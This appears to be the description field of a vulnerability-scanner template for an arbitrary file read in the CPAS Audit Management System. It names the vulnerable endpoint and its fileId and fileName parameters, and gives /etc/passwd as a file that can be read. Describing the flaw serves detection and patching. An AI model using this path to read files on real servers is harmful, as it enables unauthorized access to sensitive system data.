  description: 'The CPAS Audit Management System has been found to contain a vulnerability
    that allows arbitrary file read. This security flaw can be exploited by attackers
    to access sensitive files on the server, potentially exposing critical system
    information. The vulnerability can be triggered by sending a specially crafted
    HTTP GET request to the endpoint /cpasm4/plugInManController/downPlugs with parameters
    fileId and fileName, enabling the retrieval of arbitrary files such as /etc/passwd.
    This issue poses a significant risk to system security and should be addressed
    immediately to prevent unauthorized access and potential data breaches.
